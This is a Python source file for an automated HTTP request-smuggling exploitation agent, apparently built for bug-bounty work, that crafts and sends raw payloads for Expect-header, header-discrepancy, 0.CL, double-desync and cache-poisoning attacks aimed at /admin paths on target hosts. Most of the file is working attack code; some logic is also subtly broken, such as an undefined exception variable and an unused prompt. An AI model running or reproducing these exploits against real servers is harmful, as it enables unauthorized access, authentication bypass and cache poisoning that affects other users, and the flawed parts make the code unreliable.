
import asyncio
import logging
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import time

from utils.http_client import HTTPClient
from utils.claude_interface import ClaudeInterface
from knowledge.patterns_db import PatternsDatabase

@dataclass
class ExploitResult:
    """Container for exploitation results."""
    technique: str
    success: bool
    impact_level: str  # low, medium, high, critical
    exploit_type: str  # poc, cache_poisoning, rqp, header_smuggling
    payload: str
    evidence: Dict[str, Any]
    poc_description: str

class ExploitationAgent:
    """
    Exploitation Agent responsible for developing functional exploits.
    
    Implements exploitation strategies for validated vulnerabilities:
    - CL.0 Desync: For V-H discrepancies
    - 0.CL Desync: For H-V discrepancies with early-response gadgets
    - Double-Desync: Conversion 0.CL â†’ CL.0
    - Response Queue Poisoning (RQP): For high-impact attacks
    - Cache Poisoning: Persistent takeover via cache contamination
    - Header Smuggling: IP spoofing and authentication bypass
    """
    
    def __init__(self, claude_interface: ClaudeInterface, patterns_db: PatternsDatabase):
        self.claude = claude_interface
        self.patterns_db = patterns_db
        self.http_client = HTTPClient()
        self.logger = logging.getLogger(__name__)
        
        # Exploitation templates
        self.exploit_templates = self._initialize_exploit_templates()
        
    def _initialize_exploit_templates(self) -> Dict[str, Dict]:
        """Initialize exploitation templates for different techniques."""
        
        return {
            'expect_obfuscated': {
                'payload_template': '''POST {path} HTTP/1.1\r
Host: {host}\r
Expect: {expect_variant} 100-continue\r
Content-Length: {content_length}\r
\r
{smuggled_request}''',
                'variants': [
                    'y 100-continue',
                    '\n100-continue',
                    '100-continueX',
                    'invalid-continue'
                ]
            },
            
            'vh_hv_discrepancy': {
                'payload_template': '''GET {path} HTTP/1.1\r
{malformed_header}: {header_value}\r
Host: {host}\r
\r
''',
                'malformed_headers': [
                    ' Content-Length',
                    'Content-Length\n',
                    ' Host',
                    'Transfer-Encoding '
                ]
            },
            
            '0_cl_desync': {
                'payload_template': '''POST {gadget_path} HTTP/1.1\r
Host: {host}\r
Content-Length: 0\r
\r
GET {target_path} HTTP/1.1\r
Host: {victim_host}\r
\r
''',
                'gadgets': ['/con', '/nul', '/aux', '/nonexistent', '/admin']
            },
            
            'double_desync': {
                'setup_request': '''POST {setup_path} HTTP/1.1\r
Host: {host}\r
Content-Length: 0\r
\r
''',
                'weaponize_request': '''POST {weaponize_path} HTTP/1.1\r
Host: {host}\r
Content-Length: {cl_value}\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET {target_path} HTTP/1.1\r
Host: {victim_host}\r
X-Injected-Header: exploit-test\r
\r
'''
            },
            
            'cache_poisoning': {
                'payload_template': '''GET {path}?cb={cache_buster} HTTP/1.1\r
Host: {host}\r
X-Forwarded-Host: {evil_host}\r
\r
''',
                'poison_headers': [
                    'X-Forwarded-Host',
                    'X-Original-URL',
                    'X-Rewrite-URL',
                    'X-Host'
                ]
            }
        }
    
    async def develop_exploit(self, validated_finding: Dict[str, Any]) -> Dict[str, Any]:
        """
        Develop a functional exploit for a validated vulnerability.
        
        Args:
            validated_finding: Validated vulnerability data
            
        Returns:
            Exploitation result with PoC and evidence
        """
        technique = validated_finding.get('technique', 'unknown')
        target_url = validated_finding.get('target_url', '')
        confidence = validated_finding.get('confidence_score', 0.0)
        
        self.logger.info(f"Developing exploit for {technique} on {target_url}")
        
        try:
            # Get successful patterns from database
            patterns = await self.patterns_db.get_successful_patterns(technique)
            
            # Develop technique-specific exploit
            if technique in ['expect_vanilla', 'expect_obfuscated']:
                exploit_result = await self._exploit_expect_based(target_url, validated_finding, patterns)
            elif technique == 'vh_hv':
                exploit_result = await self._exploit_vh_hv_discrepancy(target_url, validated_finding, patterns)
            elif technique == '0_cl':
                exploit_result = await self._exploit_zero_cl_desync(target_url, validated_finding, patterns)
            elif technique == 'double_desync':
                exploit_result = await self._exploit_double_desync(target_url, validated_finding, patterns)
            else:
                exploit_result = await self._exploit_generic(target_url, validated_finding, patterns)
            
            # Enhance exploit with AI analysis
            if exploit_result.success:
                ai_enhancement = await self._enhance_exploit_with_ai(exploit_result, validated_finding)
                exploit_result.poc_description = ai_enhancement.get('enhanced_poc', exploit_result.poc_description)
                exploit_result.evidence.update(ai_enhancement.get('additional_evidence', {}))
                
                # Store successful pattern
                await self._store_successful_pattern(technique, exploit_result, validated_finding)
            
            return {
                'technique': exploit_result.technique,
                'exploit_successful': exploit_result.success,
                'impact_level': exploit_result.impact_level,
                'exploit_type': exploit_result.exploit_type,
                'payload_used': exploit_result.payload,
                'evidence': exploit_result.evidence,
                'poc_description': exploit_result.poc_description,
                'timestamp': time.time()
            }
            
        except Exception as e:
            self.logger.error(f"Exploit development failed for {technique}: {e}")
            return {
                'technique': technique,
                'exploit_successful': False,
                'error': str(e),
                'timestamp': time.time()
            }
    
    async def _exploit_expect_based(self, url: str, finding: Dict, patterns: List[Dict]) -> ExploitResult:
        """Develop exploit for Expect-based desync vulnerabilities."""
        
        technique = finding.get('technique')
        evidence = finding.get('evidence', {})
        
        # Parse URL components
        host = self._extract_host(url)
        path = self._extract_path(url)
        
        # Try different Expect header variants
        template = self.exploit_templates['expect_obfuscated']
        
        for expect_variant in template['variants']:
            try:
                # Craft exploit payload
                smuggled_request = f"GET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
                
                payload = template['payload_template'].format(
                    path=path,
                    host=host,
                    expect_variant=expect_variant,
                    content_length=len(smuggled_request),
                    smuggled_request=smuggled_request
                )
                
                # Send exploit
                response = await self._send_raw_exploit(host, payload)
                
                # Check for successful smuggling
                success_indicators = await self._check_expect_exploit_success(response, expect_variant)
                
                if success_indicators['success']:
                    return ExploitResult(
                        technique=technique,
                        success=True,
                        impact_level='medium',
                        exploit_type='request_smuggling',
                        payload=payload,
                        evidence={
                            'expect_variant_used': expect_variant,
                            'response_status': response.status,
                            'response_headers': dict(response.headers),
                            'success_indicators': success_indicators,
                            'smuggled_request_detected': True
                        },
                        poc_description=f"Expect-based request smuggling using '{expect_variant}' variant allows injection of arbitrary HTTP requests"
                    )
                    
            except Exception as e:
                self.logger.debug(f"Expect variant {expect_variant} failed: {e}")
                continue
        
        # No successful exploit
        return ExploitResult(
            technique=technique,
            success=False,
            impact_level='none',
            exploit_type='none',
            payload='',
            evidence={'attempted_variants': template['variants']},
            poc_description='No successful Expect-based exploit developed'
        )
    
    async def _exploit_vh_hv_discrepancy(self, url: str, finding: Dict, patterns: List[Dict]) -> ExploitResult:
        """Develop exploit for V-H/H-V discrepancy vulnerabilities."""
        
        technique = finding.get('technique')
        evidence = finding.get('evidence', {})
        
        host = self._extract_host(url)
        path = self._extract_path(url)
        
        template = self.exploit_templates['vh_hv_discrepancy']
        
        # Try different malformed headers
        for malformed_header in template['malformed_headers']:
            try:
                # Test different exploit scenarios
                exploit_scenarios = [
                    {'header_value': '0', 'purpose': 'content_length_masquerading'},
                    {'header_value': host, 'purpose': 'host_masquerading'},
                    {'header_value': 'chunked', 'purpose': 'transfer_encoding_masquerading'}
                ]
                
                for scenario in exploit_scenarios:
                    payload = template['payload_template'].format(
                        path=path,
                        malformed_header=malformed_header,
                        header_value=scenario['header_value'],
                        host=host
                    )
                    
                    # Send exploit
                    response = await self._send_raw_exploit(host, payload)
                    
                    # Check for discrepancy exploitation
                    success_indicators = await self._check_discrepancy_exploit_success(
                        response, malformed_header, scenario
                    )
                    
                    if success_indicators['success']:
                        return ExploitResult(
                            technique=technique,
                            success=True,
                            impact_level='medium',
                            exploit_type='header_smuggling',
                            payload=payload,
                            evidence={
                                'malformed_header_used': malformed_header,
                                'exploit_scenario': scenario,
                                'response_analysis': success_indicators,
                                'discrepancy_confirmed': True
                            },
                            poc_description=f"Header parsing discrepancy using '{malformed_header}' allows {scenario['purpose']}"
                        )
                        
            except Exception as e:
                self.logger.debug(f"Discrepancy exploit with {malformed_header} failed: {e}")
                continue
        
        return ExploitResult(
            technique=technique,
            success=False,
            impact_level='none',
            exploit_type='none',
            payload='',
            evidence={'attempted_headers': template['malformed_headers']},
            poc_description='No successful header discrepancy exploit developed'
        )
    
    async def _exploit_zero_cl_desync(self, url: str, finding: Dict, patterns: List[Dict]) -> ExploitResult:
        """Develop exploit for 0.CL desync vulnerabilities."""
        
        technique = finding.get('technique')
        evidence = finding.get('evidence', {})
        
        host = self._extract_host(url)
        
        # Get early response gadgets from finding
        gadget_path = evidence.get('gadget_path', '/nonexistent')
        
        template = self.exploit_templates['0_cl_desync']
        
        try:
            # Craft 0.CL desync payload
            victim_host = 'evil.com'  # Example victim host for demonstration
            target_path = '/admin'
            
            payload = template['payload_template'].format(
                gadget_path=gadget_path,
                host=host,
                target_path=target_path,
                victim_host=victim_host
            )
            
            # Send exploit
            response = await self._send_raw_exploit(host, payload)
            
            # Check for successful desync
            success_indicators = await self._check_zero_cl_exploit_success(response, victim_host)
            
            if success_indicators['success']:
                # Test for high-impact scenarios
                impact_level = await self._assess_zero_cl_impact(host, gadget_path, success_indicators)
                
                return ExploitResult(
                    technique=technique,
                    success=True,
                    impact_level=impact_level,
                    exploit_type='cache_poisoning' if impact_level == 'high' else 'request_smuggling',
                    payload=payload,
                    evidence={
                        'gadget_path_used': gadget_path,
                        'victim_host_injected': victim_host,
                        'success_indicators': success_indicators,
                        'impact_assessment': await self._get_impact_details(impact_level)
                    },
                    poc_description=f"0.CL desync using early-response gadget {gadget_path} allows request smuggling with {impact_level} impact"
                )
            
        except Exception as e:
            self.logger.error(f"0.CL desync exploit failed: {e}")
        
        return ExploitResult(
            technique=technique,
            success=False,
            impact_level='none',
            exploit_type='none',
            payload='',
            evidence={'attempted_gadget': gadget_path},
            poc_description='No successful 0.CL desync exploit developed'
        )
    
    async def _exploit_double_desync(self, url: str, finding: Dict, patterns: List[Dict]) -> ExploitResult:
        """Develop exploit for double-desync (0.CL â†’ CL.0) vulnerabilities."""
        
        technique = finding.get('technique')
        host = self._extract_host(url)
        
        template = self.exploit_templates['double_desync']
        
        try:
            # Stage 1: Establish 0.CL desync
            setup_payload = template['setup_request'].format(
                setup_path='/setup',
                host=host
            )
            
            await self._send_raw_exploit(host, setup_payload)
            
            # Stage 2: Weaponize with CL.0
            victim_host = 'evil.com'
            smuggled_content = f"GET /admin HTTP/1.1\r\nHost: {victim_host}\r\nX-Injected-Header: double-desync-test\r\n\r\n"
            
            weaponize_payload = template['weaponize_request'].format(
                weaponize_path='/weaponize',
                host=host,
                cl_value=len(smuggled_content),
                target_path='/target',
                victim_host=victim_host
            )
            
            # Send weaponizing request
            response = await self._send_raw_exploit(host, weaponize_payload)
            
            # Check for successful double desync
            success_indicators = await self._check_double_desync_success(response, victim_host)
            
            if success_indicators['success']:
                return ExploitResult(
                    technique=technique,
                    success=True,
                    impact_level='high',
                    exploit_type='advanced_smuggling',
                    payload=f"Stage1: {setup_payload}\n\nStage2: {weaponize_payload}",
                    evidence={
                        'double_desync_confirmed': True,
                        'victim_host_injected': victim_host,
                        'success_indicators': success_indicators,
                        'attack_chain': ['0_cl_setup', 'cl_0_weaponization']
                    },
                    poc_description="Double-desync attack (0.CL â†’ CL.0) enables advanced request smuggling with high impact potential"
                )
            
        except Exception as e:
            self.logger.error(f"Double desync exploit failed: {e}")
        
        return ExploitResult(
            technique=technique,
            success=False,
            impact_level='none',
            exploit_type='none',
            payload='',
            evidence={'error': str(e)},
            poc_description='No successful double-desync exploit developed'
        )
    
    async def _exploit_generic(self, url: str, finding: Dict, patterns: List[Dict]) -> ExploitResult:
        """Generic exploitation attempt for unknown techniques."""
        
        technique = finding.get('technique', 'unknown')
        host = self._extract_host(url)
        
        # Basic request smuggling attempt
        try:
            basic_payload = f'''POST / HTTP/1.1\r
Host: {host}\r
Content-Length: 0\r
\r
GET /admin HTTP/1.1\r
Host: {host}\r
\r
'''
            
            response = await self._send_raw_exploit(host, basic_payload)
            
            # Basic success check
            if response.status in [200, 301, 302] and '/admin' in response._text:
                return ExploitResult(
                    technique=technique,
                    success=True,
                    impact_level='low',
                    exploit_type='basic_smuggling',
                    payload=basic_payload,
                    evidence={'response_status': response.status},
                    poc_description=f"Basic request smuggling exploit for {technique}"
                )
            
        except Exception as e:
            self.logger.error(f"Generic exploit failed: {e}")
        
        return ExploitResult(
            technique=technique,
            success=False,
            impact_level='none',
            exploit_type='none',
            payload='',
            evidence={},
            poc_description='No successful exploit developed'
        )
    
    async def _send_raw_exploit(self, host: str, payload: str) -> 'HTTPResponse':
        """Send raw HTTP exploit payload."""
        
        # Parse host and port
        if ':' in host:
            hostname, port = host.split(':')
            port = int(port)
        else:
            hostname = host
            port = 443 if payload.startswith('https') else 80
        
        # Use raw socket connection for precise control
        return await self.http_client.send_raw_request(payload, hostname, port, port == 443)
    
    async def _check_expect_exploit_success(self, response, expect_variant: str) -> Dict[str, Any]:
        """Check if Expect-based exploit was successful."""
        
        success_indicators = {
            'success': False,
            'evidence': []
        }
        
        # Check for 100-continue response with obfuscated header
        if response.status == 100 and 'invalid' in expect_variant:
            success_indicators['success'] = True
            success_indicators['evidence'].append('100-continue response with invalid Expect header')
        
        # Check for error responses indicating parser confusion
        elif response.status in [400, 417] and response.response_time > 2.0:
            success_indicators['success'] = True
            success_indicators['evidence'].append('Server confusion evidenced by error response and timing')
        
        # Check for smuggled request artifacts in response
        if '/admin' in response._text or 'X-Injected-Header' in response._text:
            success_indicators['success'] = True
            success_indicators['evidence'].append('Smuggled request content detected in response')
        
        return success_indicators
    
    async def _check_discrepancy_exploit_success(self, response, malformed_header: str, scenario: Dict) -> Dict[str, Any]:
        """Check if header discrepancy exploit was successful."""
        
        success_indicators = {
            'success': False,
            'evidence': []
        }
        
        # Check for successful header masquerading
        if scenario['purpose'] == 'host_masquerading':
            if response.status in [301, 302] or 'location' in response.headers:
                success_indicators['success'] = True
                success_indicators['evidence'].append('Host header masquerading successful - redirect detected')
        
        elif scenario['purpose'] == 'content_length_masquerading':
            if response.status != 400:  # Server accepted malformed Content-Length
                success_indicators['success'] = True
                success_indicators['evidence'].append('Content-Length masquerading - server accepted malformed header')
        
        return success_indicators
    
    async def _check_zero_cl_exploit_success(self, response, victim_host: str) -> Dict[str, Any]:
        """Check if 0.CL desync exploit was successful."""
        
        success_indicators = {
            'success': False,
            'evidence': []
        }
        
        # Check for victim host injection
        if victim_host in response._text or victim_host in str(response.headers):
            success_indicators['success'] = True
            success_indicators['evidence'].append(f'Victim host {victim_host} detected in response')
        
        # Check for smuggled request indicators
        if '/admin' in response._text:
            success_indicators['success'] = True
            success_indicators['evidence'].append('Smuggled admin request detected')
        
        # Check for timing indicators (early response should be fast)
        if response.response_time < 0.5 and response.status in [200, 404]:
            success_indicators['success'] = True
            success_indicators['evidence'].append('Early response timing suggests desync success')
        
        return success_indicators
    
    async def _check_double_desync_success(self, response, victim_host: str) -> Dict[str, Any]:
        """Check if double-desync exploit was successful."""
        
        success_indicators = {
            'success': False,
            'evidence': []
        }
        
        # Check for injected header
        if 'X-Injected-Header' in str(response.headers) or 'double-desync-test' in response._text:
            success_indicators['success'] = True
            success_indicators['evidence'].append('Injected header detected - double desync successful')
        
        # Check for victim host presence
        if victim_host in response._text:
            success_indicators['success'] = True
            success_indicators['evidence'].append(f'Victim host {victim_host} in response')
        
        return success_indicators
    
    async def _assess_zero_cl_impact(self, host: str, gadget_path: str, success_indicators: Dict) -> str:
        """Assess the impact level of a successful 0.CL desync."""
        
        # Test for cache poisoning potential
        try:
            cache_test_payload = f'''GET {gadget_path}?test=cache HTTP/1.1\r
Host: {host}\r
X-Forwarded-Host: evil.com\r
\r
'''
            
            response = await self._send_raw_exploit(host, cache_test_payload)
            
            if 'evil.com' in response._text or response.status == 302:
                return 'high'  # Cache poisoning possible
            
        except:
            pass
        
        # Check for authentication bypass potential
        if '/admin' in gadget_path or '/login' in gadget_path:
            return 'medium'
        
        return 'low'
    
    async def _get_impact_details(self, impact_level: str) -> Dict[str, Any]:
        """Get detailed impact assessment."""
        
        impact_details = {
            'high': {
                'description': 'Cache poisoning and persistent takeover possible',
                'attack_scenarios': ['Web cache poisoning', 'CDN manipulation', 'Mass user impact'],
                'bounty_potential': 'high'
            },
            'medium': {
                'description': 'Authentication bypass and privilege escalation possible',
                'attack_scenarios': ['Admin panel access', 'Authentication bypass', 'User impersonation'],
                'bounty_potential': 'medium'
            },
            'low': {
                'description': 'Request smuggling demonstrated, limited impact',
                'attack_scenarios': ['Request smuggling PoC', 'Information disclosure'],
                'bounty_potential': 'low'
            }
        }
        
        return impact_details.get(impact_level, impact_details['low'])
    
    async def _enhance_exploit_with_ai(self, exploit_result: ExploitResult, finding: Dict) -> Dict[str, Any]:
        """Use Claude AI to enhance exploit description and evidence."""
        
        prompt = f"""
        Enhance this HTTP Request Smuggling exploit for bug bounty reporting:

        Technique: {exploit_result.technique}
        Success: {exploit_result.success}
        Impact: {exploit_result.impact_level}
        Payload: {exploit_result.payload[:500]}...
        Evidence: {exploit_result.evidence}

        Provide:
        1. Enhanced PoC description for bug bounty report
        2. Impact explanation for security teams
        3. Remediation recommendations
        4. Additional evidence to collect
        5. Suggested bounty severity

        Make it compelling and technically accurate.
        """
        
        try:
            response = await self.claude.generate_exploit_strategy({
                'technique': exploit_result.technique,
                'evidence': exploit_result.evidence,
                'impact_level': exploit_result.impact_level
            })
            
            return {
                'enhanced_poc': response.get('analysis', exploit_result.poc_description),
                'impact_explanation': response.get('impact_scenarios', []),
                'remediation': response.get('next_steps', []),
                'additional_evidence': response.get('structured_data', {})
            }
            
        except Exception as e:
            self.logger.error(f"AI exploit enhancement failed: {e}")
            return {}
    
    async def _store_successful_pattern(self, technique: str, exploit_result: ExploitResult, finding: Dict) -> None:
        """Store successful exploitation pattern for future use."""
        
        if exploit_result.success:
            pattern_data = {
                'technique': technique,
                'infrastructure_type': 'unknown',  # Would be extracted from finding
                'payload_template': exploit_result.payload,
                'conditions': {
                    'impact_level': exploit_result.impact_level,
                    'exploit_type': exploit_result.exploit_type
                },
                'success_rate': 1.0
            }
            
            await self.patterns_db.store_successful_pattern(pattern_data)
    
    def _extract_host(self, url: str) -> str:
        """Extract hostname from URL."""
        if '//' in url:
            return url.split('//')[1].split('/')[0]
        return url.split('/')[0]
    
    def _extract_path(self, url: str) -> str:
        """Extract path from URL."""
        if '//' in url:
            parts = url.split('//')[1].split('/', 1)
            return '/' + parts[1] if len(parts) > 1 else '/'
        return '/'
